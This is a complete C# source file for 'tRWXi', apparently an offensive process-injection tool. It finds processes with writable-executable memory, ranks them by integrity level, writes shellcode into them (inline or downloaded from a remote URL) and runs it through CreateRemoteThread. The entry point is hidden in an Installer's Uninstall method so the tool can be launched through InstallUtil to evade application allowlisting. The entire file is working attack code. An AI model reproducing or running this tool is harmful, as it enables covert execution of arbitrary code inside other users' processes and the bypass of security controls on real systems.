using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Linq;

namespace tRWXi_InstallUtil
{
    internal class ProcessInfo
    {
        internal int pid { get; set; }
        internal int rank { get; set; }
        internal string processName { get; set; }
        internal string integrityLevel { get; set; }

        internal ProcessInfo(int pid)
        {
            this.pid = pid;
        }
    }

    internal class Win32
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("KERNEL32.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr GetCurrentProcess();
        public enum IntegrityLevel : uint
        {
            Untrusted,
            LowIntegrity = 0x00001000,
            MediumIntegrity = 0x00002000,
            MediumHighIntegrity = 0x100 + MediumIntegrity,
            HighIntegrity = 0X00003000,
            SystemIntegrity = 0x00004000,
            ProtectedProcess = 0x00005000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_MANDATORY_LABEL
        {

            public SID_AND_ATTRIBUTES Label;

        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,
        UInt32 DesiredAccess, out IntPtr TokenHandle);

        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public static uint STANDARD_RIGHTS_READ = 0x00020000;
        public static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public static uint TOKEN_DUPLICATE = 0x0002;
        public static uint TOKEN_IMPERSONATE = 0x0004;
        public static uint TOKEN_QUERY = 0x0008;
        public static uint TOKEN_QUERY_SOURCE = 0x0010;
        public static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public static uint TOKEN_ADJUST_GROUPS = 0x0040;
        public static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        public static uint TOKEN_ADJUST_SESSIONID = 0x0100;
        public static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public static uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr psid);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LocalAlloc(uint uFlags, uint uBytes);

        [Flags]
        public enum LocalMemoryFlags
        {
            LMEM_FIXED = 0x0000,
            LMEM_MOVEABLE = 0x0002,
            LMEM_NOCOMPACT = 0x0010,
            LMEM_NODISCARD = 0x0020,
            LMEM_ZEROINIT = 0x0040,
            LMEM_MODIFY = 0x0080,
            LMEM_DISCARDABLE = 0x0F00,
            LMEM_VALID_FLAGS = 0x0F72,
            LMEM_INVALID_HANDLE = 0x8000,
            LHND = (LMEM_MOVEABLE | LMEM_ZEROINIT),
            LPTR = (LMEM_FIXED | LMEM_ZEROINIT),
            NONZEROLHND = (LMEM_MOVEABLE),
            NONZEROLPTR = (LMEM_FIXED)
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        uint TokenInformationLength,
        out uint ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        };

        [DllImport("kernel32.dll")]
        public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        public const Int32 TH32CS_SNAPPROCESS = 0x02;
        public const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
        public const Int32 MEM_COMMIT = 0x1000;
        public const Int32 MEM_PRIVATE = 0x20000;
        public const Int32 PROCESS_ALL_ACCESS = 0x001F0FFF;

        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }
    }

    internal class ProcessMemoryInfo
    {
        internal IntPtr baseAddress { get; set; }
        internal IntPtr size { get; set; }
        internal ProcessMemoryInfo(IntPtr baseAddress, IntPtr size)
        {
            this.baseAddress = baseAddress;
            this.size = size;
        }
    }
    internal class Shellcoder
    {
        internal static byte[] convert(String data)
        {
            string[] data_spl = data.Split(',');
            byte[] shellcode = new byte[data_spl.Length];
            int byter = 0;
            for (int i = 0; i < shellcode.Length; i++)
            {
                byter = (int)new System.ComponentModel.Int32Converter().ConvertFromString(data_spl[i]);
                shellcode[i] = Convert.ToByte(byter);
            }
            return shellcode;
        }
        internal static byte[] fetch(String url)
        {
            System.Net.WebClient client = new System.Net.WebClient();
            string data = client.DownloadString(url);
            string[] data_spl = data.Split(',');
            byte[] shellcode = new byte[data_spl.Length];
            int byter = 0;
            for (int i = 0; i < shellcode.Length; i++)
            {
                byter = (int)new System.ComponentModel.Int32Converter().ConvertFromString(data_spl[i]);
                shellcode[i] = Convert.ToByte(byter);
            }
            return shellcode;
        }
    }
    internal class Helper
    {
        internal static void help()
        {
            Console.WriteLine("tRWXi v1.0.0\n\nUsage: \n\t.\\tRWXi.exe /enumerate ;" +
                                     "\n\t.\\tRWXi.exe /inject  /pid=<pid> /address=<hex address> /url=<remote shell code> ;" +
                                     "\n\t.\\tRWXi.exe /inject  /pid=<pid> /address=<hex address> /data=<hex code> ;" +
                                     "\n\t.\\tRWXi.exe /read    /pid=<pid> /address=<hex address> /size=<size> ;" +
                                     "\n\t.\\tRWXi.exe /trigger /pid=<pid> /address=<hex address> ;");
        }
    }

    class Program
    {
        static void Main(string[] args)
        {

        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(IDictionary savedState)
        {
            Dictionary<string, string> parameters = new Dictionary<string, string>();
            if (this.Context.Parameters.ContainsKey("enumerate"))
            {
                parameters.Add("enumerate", "true");
            }
            if (this.Context.Parameters.ContainsKey("inject"))
            {
                parameters.Add("inject", "true");

                if (this.Context.Parameters.ContainsKey("pid"))
                {
                    parameters.Add("pid", this.Context.Parameters["pid"]);
                }
                if (this.Context.Parameters.ContainsKey("address"))
                {
                    parameters.Add("address", this.Context.Parameters["address"]);
                }
                if (this.Context.Parameters.ContainsKey("data"))
                {
                    parameters.Add("data", this.Context.Parameters["data"]);
                }
                if (this.Context.Parameters.ContainsKey("url"))
                {
                    parameters.Add("url", this.Context.Parameters["url"]);
                }
            }
            if (this.Context.Parameters.ContainsKey("read"))
            {
                parameters.Add("read", "true");

                if (this.Context.Parameters.ContainsKey("pid"))
                {
                    parameters.Add("pid", this.Context.Parameters["pid"]);
                }
                if (this.Context.Parameters.ContainsKey("address"))
                {
                    parameters.Add("address", this.Context.Parameters["address"]);
                }
                if (this.Context.Parameters.ContainsKey("size"))
                {
                    parameters.Add("size", this.Context.Parameters["size"]);
                }
            }
            if (this.Context.Parameters.ContainsKey("trigger"))
            {
                parameters.Add("trigger", "true");

                if (this.Context.Parameters.ContainsKey("pid"))
                {
                    parameters.Add("pid", this.Context.Parameters["pid"]);
                }
                if (this.Context.Parameters.ContainsKey("address"))
                {
                    parameters.Add("address", this.Context.Parameters["address"]);
                }
            }

            try
            {
                Win32.PROCESSENTRY32 pe = new Win32.PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(pe);

                Win32.MEMORY_BASIC_INFORMATION mbi = new Win32.MEMORY_BASIC_INFORMATION();

                IntPtr lpAddress = IntPtr.Zero;

                IntPtr hSnapshot = Win32.CreateToolhelp32Snapshot(Win32.TH32CS_SNAPPROCESS, 0);

                bool hResult = Win32.Process32First(hSnapshot, ref pe);

                Dictionary<ProcessInfo, List<ProcessMemoryInfo>> processes = new Dictionary<ProcessInfo, List<ProcessMemoryInfo>>();

                IntPtr numberOfBytesWritten = IntPtr.Zero;

                string integrityLevel = "";

                int rank;

                if (parameters.ContainsKey("enumerate"))
                {
                    Console.WriteLine("[*] Started enumeration");

                    while (hResult)
                    {
                        IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);
                        ProcessInfo pi = new ProcessInfo((int)pe.th32ProcessID);

                        while (Win32.VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                        {
                            lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                            if (mbi.AllocationProtect == Win32.PAGE_EXECUTE_READ_WRITE && mbi.State == Win32.MEM_COMMIT && mbi.Type == Win32.MEM_PRIVATE)
                            {
                                if (!processes.ContainsKey(pi))
                                {
                                    processes[pi] = new List<ProcessMemoryInfo>();
                                }

                                pi.processName = pe.szExeFile;

                                IntPtr hToken;
                                unsafe
                                {
                                    Win32.OpenProcessToken(
                                        hProcess,
                                        Win32.TOKEN_QUERY,
                                        out hToken);

                                    var returnLength = 0U;

                                    Win32.GetTokenInformation(
                                        hToken,
                                        Win32.TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                                        IntPtr.Zero,
                                        0U,
                                        out returnLength);

                                    var lpTokenInfo = (Win32.TOKEN_MANDATORY_LABEL*)Win32.LocalAlloc((uint)Win32.LocalMemoryFlags.LMEM_FIXED, returnLength);

                                    IntPtr p = (IntPtr)lpTokenInfo;

                                    Win32.GetTokenInformation(
                                        hToken,
                                        Win32.TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                                        p,
                                        returnLength,
                                        out returnLength);

                                    var lpCount = Win32.GetSidSubAuthorityCount(lpTokenInfo->Label.Sid);
                                    var lpSubAuthority = Win32.GetSidSubAuthority(lpTokenInfo->Label.Sid, (uint)Marshal.ReadInt32(lpCount) - 1);

                                    switch ((uint)Marshal.ReadInt32(lpSubAuthority))
                                    {
                                        case >= (uint)Win32.IntegrityLevel.SystemIntegrity:
                                            integrityLevel = "SYSTEM";
                                            rank = 0;
                                            break;

                                        case >= (uint)Win32.IntegrityLevel.HighIntegrity:
                                            integrityLevel = "High";
                                            rank = 1;
                                            break;

                                        case >= (uint)Win32.IntegrityLevel.MediumIntegrity:
                                            integrityLevel = "Medium";
                                            rank = 2;
                                            break;

                                        case >= (uint)Win32.IntegrityLevel.LowIntegrity:
                                            integrityLevel = "Low";
                                            rank = 3;
                                            break;

                                        default:
                                            integrityLevel = "Untrusted";
                                            rank = 4;
                                            break;
                                    }

                                    pi.rank = rank;
                                    pi.integrityLevel = integrityLevel;

                                    processes[pi].Add(new ProcessMemoryInfo(mbi.BaseAddress, mbi.RegionSize));

                                    Win32.LocalFree(p);
                                    Win32.CloseHandle(hToken);
                                }
                            }
                        }
                        Win32.CloseHandle(hProcess);
                        hResult = Win32.Process32Next(hSnapshot, ref pe);
                        lpAddress = IntPtr.Zero;
                    }
                }
                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
                {
                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                    {
                        int pid = Convert.ToInt32(parameters["pid"]);
                        IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
                        IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));

                        if (parameters.ContainsKey("read"))
                        {
                            int size = Convert.ToInt32(parameters["size"]);
                            byte[] output = new byte[size];
                            IntPtr written = new IntPtr();
                            Win32.ReadProcessMemory(hProcess, addr, output, size, out written);
                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
                            Environment.Exit(0);
                        }
                        else if (parameters.ContainsKey("inject"))
                        {
                            byte[] data;
                            if (parameters.ContainsKey("data"))
                            {
                                data = Shellcoder.convert(parameters["data"]);
                            }
                            else if (parameters.ContainsKey("url"))
                            {
                                data = Shellcoder.fetch(parameters["url"]);
                            }
                            else
                            {
                                data = new byte[] { };
                            }
                            Console.WriteLine("[*] Started injection");
                            Win32.WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                        }
                        else { }

                        Console.WriteLine("[*] Starting execution...");
                        IntPtr res = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        if ((int)res != 0)
                        {
                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                        }
                        Environment.Exit(0);
                    }
                    else
                    {
                        Helper.help();
                        Environment.Exit(1);
                    }
                }
                else
                {
                    Helper.help();
                    Environment.Exit(1);
                }

                Win32.CloseHandle(hSnapshot);

                if (parameters.ContainsKey("enumerate"))
                {
                    var sortedProcesses = from entry in processes orderby entry.Key.rank descending select entry;

                    foreach (KeyValuePair<ProcessInfo, List<ProcessMemoryInfo>> kv in sortedProcesses)
                    {
                        Console.WriteLine(String.Format("[{0}] {1} -> {2}: ", kv.Key.integrityLevel, kv.Key.pid, kv.Key.processName));
                        foreach (ProcessMemoryInfo pmi in kv.Value)
                        {
                            Console.WriteLine(String.Format("\t\tbaseAddress:0x{0:X}\tsize::{1}", pmi.baseAddress.ToInt64(), pmi.size));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                Environment.Exit(1);
            }
        }
    }
}